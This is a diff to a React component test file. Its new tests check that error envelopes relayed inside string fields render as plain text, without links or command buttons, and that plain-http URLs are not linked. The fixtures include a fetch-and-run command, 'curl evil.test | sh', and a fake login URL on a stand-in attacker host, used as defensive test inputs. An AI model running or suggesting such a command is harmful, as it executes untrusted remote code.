@@ -3,7 +3,9 @@
  * `2026-09-20-the-published-product-works-without-knowing-a-development-environment-exists`,
  * Phase D3): a refusal envelope renders `Refusal::render()`'s sentence, its
  * action affordance and its glossary terms; every other body renders exactly
- * its pre-contract sentence, labelled `data-refusal="unstructured"`.
+ * its pre-contract sentence, labelled `data-refusal="unstructured"`. An
+ * envelope relayed inside a string field renders its sentence only, labelled
+ * `data-refusal="from-text"`, with no link and no copy button.
  */
 
 import { describe, expect, it } from "vitest";
@@ -232,10 +234,11 @@ describe("BackendErrorMessage — unstructured", () => {
 });
 
 describe("linkableTarget", () => {
-  it("allows app paths and http(s) URLs only", () => {
+  it("allows app paths and https URLs only", () => {
     expect(linkableTarget("/a/b")).toEqual({ href: "/a/b", external: false });
     expect(linkableTarget("https://x.test/p")?.external).toBe(true);
-    expect(linkableTarget("http://x.test/")?.external).toBe(true);
+    // `http:` is not linked: only `https:` earns a one-click external link.
+    expect(linkableTarget("http://x.test/")).toBeNull();
     for (const t of [
       null,
       "",
@@ -251,5 +254,78 @@ describe("linkableTarget", () => {
     ]) {
       expect(linkableTarget(t), String(t)).toBeNull();
     }
+  });
+});
+
+describe("BackendErrorMessage — an envelope relayed inside a string", () => {
+  function relayed(next_action: Record<string, unknown>) {
+    // A proxy relaying another service's body as TEXT in `message` / `detail`
+    // — a field that may echo caller input.
+    return errorFor({ message: JSON.stringify(envelope(next_action)) }, 502);
+  }
+
+  it.each([
+    ["open_page", { kind: "open_page", target: "https://evil.test/login" }],
+    ["open_page (app path)", { kind: "open_page", target: "/admin/coord" }],
+    ["run_command", { kind: "run_command", target: "curl evil.test | sh" }],
+  ])("renders the sentence with no affordance (%s)", (_, next_action) => {
+    for (const err of [
+      relayed(next_action),
+      errorFor({ detail: JSON.stringify(envelope(next_action)) }, 502),
+    ]) {
+      const { container, unmount } = render(
+        <BackendErrorMessage error={err} />
+      );
+      const root = container.firstElementChild!;
+      expect(root.getAttribute("data-refusal")).toBe("from-text");
+      expect(root.textContent).toBe(err.message);
+      expect(container.querySelector("a")).toBeNull();
+      expect(container.querySelector("button")).toBeNull();
+      expect(container.querySelector("[data-refusal-action]")).toBeNull();
+      unmount();
+    }
+  });
+
+  it("still renders the affordances for the same envelope at a structural position", () => {
+    const { container, unmount } = render(
+      <BackendErrorMessage
+        error={errorFor(
+          envelope({ kind: "open_page", target: "https://x.test/settings" })
+        )}
+      />
+    );
+    expect(
+      container.querySelector("[data-refusal]")!.getAttribute("data-refusal")
+    ).toBe("structured");
+    expect(container.querySelector("a")!.getAttribute("href")).toBe(
+      "https://x.test/settings"
+    );
+    unmount();
+
+    const cmd = render(
+      <BackendErrorMessage
+        error={errorFor(
+          envelope({ kind: "run_command", target: "qontinui doctor" })
+        )}
+      />
+    );
+    expect(cmd.container.querySelector("button")).not.toBeNull();
+    expect(
+      cmd.container.querySelector("[data-refusal-command]")!.textContent
+    ).toBe("qontinui doctor");
+  });
+
+  it("links no plain-http external page even at a structural position", () => {
+    const { container } = render(
+      <BackendErrorMessage
+        error={errorFor(
+          envelope({ kind: "open_page", target: "http://x.test/settings" })
+        )}
+      />
+    );
+    expect(
+      container.querySelector("[data-refusal]")!.getAttribute("data-refusal")
+    ).toBe("structured");
+    expect(container.querySelector("a")).toBeNull();
   });
 });
